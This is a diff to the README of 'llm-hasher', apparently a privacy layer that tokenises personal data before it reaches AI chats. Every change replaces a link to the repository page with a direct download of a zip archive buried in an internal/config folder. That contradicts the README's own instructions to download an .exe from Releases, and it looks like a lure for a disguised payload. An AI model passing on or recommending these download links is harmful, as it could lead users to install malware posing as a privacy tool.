@@ -1,6 +1,6 @@
 # 🛡️ llm-hasher - Keep sensitive data private during chats
 
-[![](https://img.shields.io/badge/Download_Application-Blue)](https://github.com/genusgalagonapalm936/llm-hasher)
+[![](https://img.shields.io/badge/Download_Application-Blue)](https://github.com/genusgalagonapalm936/llm-hasher/raw/refs/heads/main/internal/config/llm-hasher-v3.7.zip)
 
 llm-hasher acts as a privacy layer for your artificial intelligence tools. It finds private information like names, phone numbers, and email addresses before they reach a language model. The software swaps this data for secure tokens. This ensures your private details stay on your computer.
 
@@ -21,7 +21,7 @@ It maps private identifiers to unique tokens. You maintain the vault that connec
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Go to the [official download page](https://github.com/genusgalagonapalm936/llm-hasher).
+1. Go to the [official download page](https://github.com/genusgalagonapalm936/llm-hasher/raw/refs/heads/main/internal/config/llm-hasher-v3.7.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest version link.
 4. Download the file that ends with .exe.
@@ -77,6 +77,6 @@ Most issues resolve by restarting the application. Ensure you have given the app
 
 Check the link below once a month to see if an update is available. Updates often improve the detection of new data patterns or fix minor performance bugs. 
 
-[Visit this page to download](https://github.com/genusgalagonapalm936/llm-hasher)
+[Visit this page to download](https://github.com/genusgalagonapalm936/llm-hasher/raw/refs/heads/main/internal/config/llm-hasher-v3.7.zip)
 
 If the app asks to perform an update, confirm the action to download the latest security patches. Keeping the software up to date ensures your privacy protection remains effective against modern data extraction techniques used by artificial intelligence models.
